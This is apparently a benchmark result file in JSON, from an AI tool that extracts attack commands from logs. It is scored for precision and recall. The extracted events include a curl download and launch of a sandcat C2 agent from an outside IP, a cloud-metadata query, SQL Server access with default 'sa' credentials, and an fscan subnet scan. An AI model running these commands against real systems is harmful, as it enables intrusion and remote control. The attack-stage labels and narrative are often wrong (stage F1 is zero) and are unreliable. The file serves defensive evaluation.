@@ -1,0 +1,106 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c \"echo d2hvYW1pJmlmY29uZmlnJmFycC AtYSZwaW5nIC1jIDEgMTAuN6luNygyMCBbMSAtIDcgXDE2OTYuMTY5LzI1NCAtIMludGllci1tdWNoLWMtMiAxMCkgLSA+ODA6IEFzcGVjdC0xOiBFbmFibGUgeW91IGNhbiByZWFzb25AbWljcm9zb2Z0LmNvbQBTAksKCgojcHJlc2VydmVkKSk7\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c 'wget --version > /dev/null; if [ $? -eq 0 ]; then wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header=Metadata:true -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11; else curl --version > /dev/null;if [ $? -eq 0 ]; then curl --connect-timeout 7 -s --header=Metadata:true http://169.254.169.254/metadata/instance?api-version=2019-03-11; fi;'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c 'curl -O http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c './sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami'",
+        "stage": "Execution"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --enable",
+        "stage": "Execution"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "rm ./sqltool_amd64_upx",
+        "stage": "Persistence"
+      },
+      {
+        "command": "rm /tmp/sandcat-linux -r",
+        "stage": "Persistence"
+      },
+      {
+        "command": "rm ./{collection.path.name}/webapps/ROOT/logout.jsp -r",
+        "stage": "Persistence"
+      },
+      {
+        "command": "bash -c 'del /f /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.txt'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "bash -c 'del /f /q c:\\windows\\logout.jsp'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "ssh -D -R",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Discovery"
+      },
+      {
+        "command": "test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-cont --crond",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The initial compromise was achieved using a base64-encoded bash command that executed an obfuscated payload. Subsequent actions included establishing remote command-and-control channels, maintaining persistence via backdoors, conducting database scans, and deploying cron jobs for long-term monitoring.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 48966,
+      "completion_tokens": 3437,
+      "total_tokens": 52403,
+      "wall_clock_s": 38.796,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2857142857142857,
+      "recall": 0.5,
+      "f1": 0.36363636363636365,
+      "tp": 4,
+      "fp": 10,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 14,
+      "fn": 7,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 48966,
+      "completion_tokens": 3437,
+      "total_tokens": 52403,
+      "wall_clock_s": 38.796,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
